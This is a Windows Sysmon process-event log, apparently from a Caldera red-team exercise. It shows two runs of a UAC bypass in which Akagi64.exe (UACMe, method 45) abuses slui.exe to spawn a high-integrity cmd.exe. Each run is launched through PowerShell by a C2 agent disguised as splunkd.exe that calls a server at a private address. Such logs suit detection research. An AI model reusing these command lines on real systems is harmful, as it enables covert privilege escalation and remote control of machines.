TimeCreated : 2026/4/22 上午 12:40:34
Id          : 5
Message     : Process terminated:
              RuleName: -
              UtcTime: 2026-04-21 16:40:34.878
              ProcessGuid: {d8beb913-a87d-69e7-1816-000000001200}
              ProcessId: 3392
              Image: C:\Users\Public\Akagi64.exe
              User: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:40:30
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:40:30.020
              ProcessGuid: {d8beb913-a87e-69e7-1d16-000000001200}
              ProcessId: 2844
              Image: C:\Windows\System32\cmd.exe
              FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
              Description: Windows Command Processor
              Product: Microsoft® Windows® Operating System
              Company: Microsoft Corporation
              OriginalFileName: Cmd.Exe
              CommandLine: "C:\Windows\System32\cmd.exe" 
              CurrentDirectory: C:\WINDOWS\system32\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-7ccf-010000000000}
              LogonId: 0x1CF7C
              TerminalSessionId: 1
              IntegrityLevel: High
              Hashes: MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156
              EB1FA857E99CEB9
              ParentProcessGuid: {d8beb913-a87d-69e7-1c16-000000001200}
              ParentProcessId: 11556
              ParentImage: C:\Windows\System32\slui.exe
              ParentCommandLine: "C:\WINDOWS\system32\slui.exe" 0x03
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:40:29
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:40:29.897
              ProcessGuid: {d8beb913-a87d-69e7-1c16-000000001200}
              ProcessId: 11556
              Image: C:\Windows\System32\slui.exe
              FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
              Description: Windows Activation Client
              Product: Microsoft® Windows® Operating System
              Company: Microsoft Corporation
              OriginalFileName: slui.exe
              CommandLine: "C:\WINDOWS\system32\slui.exe" 0x03
              CurrentDirectory: C:\WINDOWS\system32\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-7ccf-010000000000}
              LogonId: 0x1CF7C
              TerminalSessionId: 1
              IntegrityLevel: High
              Hashes: MD5=CF0A69B5DA75D171E5BFAE9CEC695F8C,SHA256=BAE2B3360B3493027FA43B6E942D3C37D4476B6FD6D8E6C8AAF9D97361D0D26B,IMPHASH=965E6FDBF2B84C0CD
              AA6303EA677DF71
              ParentProcessGuid: {d8beb913-a87d-69e7-1b16-000000001200}
              ParentProcessId: 7228
              ParentImage: C:\Windows\System32\slui.exe
              ParentCommandLine: "C:\WINDOWS\system32\slui.exe" 
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:40:29
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:40:29.765
              ProcessGuid: {d8beb913-a87d-69e7-1b16-000000001200}
              ProcessId: 7228
              Image: C:\Windows\System32\slui.exe
              FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
              Description: Windows Activation Client
              Product: Microsoft® Windows® Operating System
              Company: Microsoft Corporation
              OriginalFileName: slui.exe
              CommandLine: "C:\WINDOWS\system32\slui.exe" 
              CurrentDirectory: C:\WINDOWS\system32\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-7ccf-010000000000}
              LogonId: 0x1CF7C
              TerminalSessionId: 1
              IntegrityLevel: High
              Hashes: MD5=CF0A69B5DA75D171E5BFAE9CEC695F8C,SHA256=BAE2B3360B3493027FA43B6E942D3C37D4476B6FD6D8E6C8AAF9D97361D0D26B,IMPHASH=965E6FDBF2B84C0CD
              AA6303EA677DF71
              ParentProcessGuid: {d8beb913-a87d-69e7-1816-000000001200}
              ParentProcessId: 3392
              ParentImage: C:\Users\Public\Akagi64.exe
              ParentCommandLine: "C:\Users\Public\Akagi64.exe" 45 C:\Windows\System32\cmd.exe
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:40:29
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:40:29.347
              ProcessGuid: {d8beb913-a87d-69e7-1816-000000001200}
              ProcessId: 3392
              Image: C:\Users\Public\Akagi64.exe
              FileVersion: 3.2.2.1911
              Description: UACMe main module
              Product: UACMe
              Company: Hazardous Environments
              OriginalFileName: Akagi.exe
              CommandLine: "C:\Users\Public\Akagi64.exe" 45 C:\Windows\System32\cmd.exe
              CurrentDirectory: C:\Users\Public\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-0bd1-010000000000}
              LogonId: 0x1D10B
              TerminalSessionId: 1
              IntegrityLevel: Medium
              Hashes: MD5=CA3FE69BFDBD536856BF36BBB8C949D4,SHA256=9556E16A8D2B003DA04EC9A8973E038DA0DAD0490B58784BB7F46AC4BC37C755,IMPHASH=54856A20CA0C34D60
              B4BE776680C65F5
              ParentProcessGuid: {d8beb913-a87d-69e7-1716-000000001200}
              ParentProcessId: 10432
              ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
              ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ".\Akagi64.exe 45 C:\Windows\System32\cmd.exe"
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:40:29
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:40:29.082
              ProcessGuid: {d8beb913-a87d-69e7-1716-000000001200}
              ProcessId: 10432
              Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
              FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
              Description: Windows PowerShell
              Product: Microsoft® Windows® Operating System
              Company: Microsoft Corporation
              OriginalFileName: PowerShell.EXE
              CommandLine: powershell.exe -ExecutionPolicy Bypass -C ".\Akagi64.exe 45 C:\Windows\System32\cmd.exe"
              CurrentDirectory: C:\Users\Public\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-0bd1-010000000000}
              LogonId: 0x1D10B
              TerminalSessionId: 1
              IntegrityLevel: Medium
              Hashes: MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B1
              98160AAB4D0AE77
              ParentProcessGuid: {d8beb913-a529-69e7-0616-000000001200}
              ParentProcessId: 4008
              ParentImage: C:\Users\Public\splunkd.exe
              ParentCommandLine: "C:\Users\Public\splunkd.exe" -server http://10.1.106.114:8888 -group red 
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:27:59
Id          : 5
Message     : Process terminated:
              RuleName: -
              UtcTime: 2026-04-21 16:27:59.819
              ProcessGuid: {d8beb913-a58a-69e7-0b16-000000001200}
              ProcessId: 11740
              Image: C:\Users\Public\Akagi64.exe
              User: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:27:54
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:27:54.960
              ProcessGuid: {d8beb913-a58a-69e7-1016-000000001200}
              ProcessId: 12152
              Image: C:\Windows\System32\cmd.exe
              FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
              Description: Windows Command Processor
              Product: Microsoft® Windows® Operating System
              Company: Microsoft Corporation
              OriginalFileName: Cmd.Exe
              CommandLine: "C:\Windows\System32\cmd.exe" 
              CurrentDirectory: C:\WINDOWS\system32\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-7ccf-010000000000}
              LogonId: 0x1CF7C
              TerminalSessionId: 1
              IntegrityLevel: High
              Hashes: MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156
              EB1FA857E99CEB9
              ParentProcessGuid: {d8beb913-a58a-69e7-0f16-000000001200}
              ParentProcessId: 11240
              ParentImage: C:\Windows\System32\slui.exe
              ParentCommandLine: "C:\WINDOWS\system32\slui.exe" 0x03
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:27:54
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:27:54.848
              ProcessGuid: {d8beb913-a58a-69e7-0f16-000000001200}
              ProcessId: 11240
              Image: C:\Windows\System32\slui.exe
              FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
              Description: Windows Activation Client
              Product: Microsoft® Windows® Operating System
              Company: Microsoft Corporation
              OriginalFileName: slui.exe
              CommandLine: "C:\WINDOWS\system32\slui.exe" 0x03
              CurrentDirectory: C:\WINDOWS\system32\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-7ccf-010000000000}
              LogonId: 0x1CF7C
              TerminalSessionId: 1
              IntegrityLevel: High
              Hashes: MD5=CF0A69B5DA75D171E5BFAE9CEC695F8C,SHA256=BAE2B3360B3493027FA43B6E942D3C37D4476B6FD6D8E6C8AAF9D97361D0D26B,IMPHASH=965E6FDBF2B84C0CD
              AA6303EA677DF71
              ParentProcessGuid: {d8beb913-a58a-69e7-0e16-000000001200}
              ParentProcessId: 2988
              ParentImage: C:\Windows\System32\slui.exe
              ParentCommandLine: "C:\WINDOWS\system32\slui.exe" 
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:27:54
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:27:54.711
              ProcessGuid: {d8beb913-a58a-69e7-0e16-000000001200}
              ProcessId: 2988
              Image: C:\Windows\System32\slui.exe
              FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
              Description: Windows Activation Client
              Product: Microsoft® Windows® Operating System
              Company: Microsoft Corporation
              OriginalFileName: slui.exe
              CommandLine: "C:\WINDOWS\system32\slui.exe" 
              CurrentDirectory: C:\WINDOWS\system32\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-7ccf-010000000000}
              LogonId: 0x1CF7C
              TerminalSessionId: 1
              IntegrityLevel: High
              Hashes: MD5=CF0A69B5DA75D171E5BFAE9CEC695F8C,SHA256=BAE2B3360B3493027FA43B6E942D3C37D4476B6FD6D8E6C8AAF9D97361D0D26B,IMPHASH=965E6FDBF2B84C0CD
              AA6303EA677DF71
              ParentProcessGuid: {d8beb913-a58a-69e7-0b16-000000001200}
              ParentProcessId: 11740
              ParentImage: C:\Users\Public\Akagi64.exe
              ParentCommandLine: "C:\Users\Public\Akagi64.exe" 45 C:\Windows\System32\cmd.exe
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:27:54
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:27:54.250
              ProcessGuid: {d8beb913-a58a-69e7-0b16-000000001200}
              ProcessId: 11740
              Image: C:\Users\Public\Akagi64.exe
              FileVersion: 3.2.2.1911
              Description: UACMe main module
              Product: UACMe
              Company: Hazardous Environments
              OriginalFileName: Akagi.exe
              CommandLine: "C:\Users\Public\Akagi64.exe" 45 C:\Windows\System32\cmd.exe
              CurrentDirectory: C:\Users\Public\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-0bd1-010000000000}
              LogonId: 0x1D10B
              TerminalSessionId: 1
              IntegrityLevel: Medium
              Hashes: MD5=CA3FE69BFDBD536856BF36BBB8C949D4,SHA256=9556E16A8D2B003DA04EC9A8973E038DA0DAD0490B58784BB7F46AC4BC37C755,IMPHASH=54856A20CA0C34D60
              B4BE776680C65F5
              ParentProcessGuid: {d8beb913-a589-69e7-0a16-000000001200}
              ParentProcessId: 3140
              ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
              ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ".\Akagi64.exe 45 C:\Windows\System32\cmd.exe"
              ParentUser: caldera-agent\caldera

TimeCreated : 2026/4/22 上午 12:27:54
Id          : 1
Message     : Process Create:
              RuleName: -
              UtcTime: 2026-04-21 16:27:53.999
              ProcessGuid: {d8beb913-a589-69e7-0a16-000000001200}
              ProcessId: 3140
              Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
              FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
              Description: Windows PowerShell
              Product: Microsoft® Windows® Operating System
              Company: Microsoft Corporation
              OriginalFileName: PowerShell.EXE
              CommandLine: powershell.exe -ExecutionPolicy Bypass -C ".\Akagi64.exe 45 C:\Windows\System32\cmd.exe"
              CurrentDirectory: C:\Users\Public\
              User: caldera-agent\caldera
              LogonGuid: {d8beb913-45cc-69e3-0bd1-010000000000}
              LogonId: 0x1D10B
              TerminalSessionId: 1
              IntegrityLevel: Medium
              Hashes: MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B1
              98160AAB4D0AE77
              ParentProcessGuid: {d8beb913-a529-69e7-0616-000000001200}
              ParentProcessId: 4008
              ParentImage: C:\Users\Public\splunkd.exe
              ParentCommandLine: "C:\Users\Public\splunkd.exe" -server http://10.1.106.114:8888 -group red 
              ParentUser: caldera-agent\caldera